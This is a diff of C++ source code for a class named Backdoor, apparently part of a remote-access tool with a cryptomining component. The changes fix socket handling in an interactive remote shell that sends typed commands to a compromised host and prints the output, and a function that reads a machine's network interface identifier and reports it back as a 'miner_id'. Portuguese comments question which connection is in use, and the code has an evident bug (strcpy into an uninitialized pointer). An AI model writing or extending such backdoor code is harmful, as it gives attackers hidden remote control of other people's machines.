@@ -16,20 +16,19 @@ void Backdoor::shell(){
             std::cout << "~$ ";
             std::getline(std::cin, input);
             if(input == "exit"){
-                this->c->send_message(sock, "exit"); // ?????? SOCK VAI SER QUAL DAS CONEXÕES ???
+                this->c->send_message(this->sock, "exit"); // ?????? SOCK VAI SER QUAL DAS CONEXÕES ???
                 break;
             }else{
                 const char * msg = input.c_str();
                 char * output;
-                this->c->send_message(sock, msg); // QUAL SOCK ??????
-                output = this->c->recv_message(sock); // QUAL SOCK ?????????
+                this->c->send_message(this->sock, msg); // QUAL SOCK ??????
+                output = this->c->recv_message(this->sock); // QUAL SOCK ?????????
                 std::cout << output << std::endl;
             }   
         }
+        
     }else{
-
         while(true){
-
             char *command = this->c->recv_message(this->sock);    
             char *copy, *part;
             strcpy(copy, command);
@@ -165,7 +164,7 @@ void Backdoor::get_miner_id(){
             fscanf(g, "%s", eth0);
             fclose(g);
             c->send_message(this->sock, eth0);
-            this->miner_id = eth0
+            this->miner_id = eth0;
         }
     }
 }
